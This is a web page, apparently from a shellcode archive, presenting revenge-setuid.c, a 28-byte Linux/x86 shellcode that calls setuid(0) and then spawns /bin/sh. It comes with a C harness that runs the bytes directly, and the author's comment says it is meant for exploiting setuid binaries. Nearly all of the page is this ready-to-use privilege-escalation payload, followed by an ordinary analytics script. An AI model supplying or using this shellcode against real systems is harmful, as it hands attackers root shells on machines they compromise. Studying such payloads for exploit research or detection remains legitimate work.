<html><head><title>Linux/x86 - setuid(0) + execve(/bin//sh, [/bin//sh], NULL) - 28 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * revenge-setuid.c, v1.0 2006/09/30 14:57
 *
 * linux/x86 setuid(0) + execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;], NULL) shellcode
 * once again...
 *
 * [    setuid (6 bytes) + execve (22 bytes)  = 28 bytes       ]
 * [                                                           ]
 * [    Same as revenge-execve.c we start the 2 system         ]
 * [    calls with a mov resulting in 2 bytes less, but        ]
 * [    this one is only for suid binary exploitation.         ]
 * [                                                           ]
 *
 * http://www.0xcafebabe.it
 * &lt;revenge@0xcafebabe.it&gt;
 *
 */

char sc[] =
                                     // &lt;_start&gt;
       &quot;\xb0\x17&quot;                    // mov    $0x17,%al
       &quot;\x31\xdb&quot;                    // xor    %ebx,%ebx
       &quot;\xcd\x80&quot;                    // int    $0x80
       &quot;\xb0\x0b&quot;                    // mov    $0xb,%al
       &quot;\x99&quot;                        // cltd
       &quot;\x52&quot;                        // push   %edx
       &quot;\x68\x2f\x2f\x73\x68&quot;        // push   $0x68732f2f
       &quot;\x68\x2f\x62\x69\x6e&quot;        // push   $0x6e69622f
       &quot;\x89\xe3&quot;                    // mov    %esp,%ebx
       &quot;\x52&quot;                        // push   %edx
       &quot;\x53&quot;                        // push   %ebx
       &quot;\x89\xe1&quot;                    // mov    %esp,%ecx
       &quot;\xcd\x80&quot;                    // int    $0x80
;

int main()
{
       void    (*fp)(void) = (void (*)(void))sc;

       printf(&quot;Length: %d\n&quot;,strlen(sc));
       fp();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
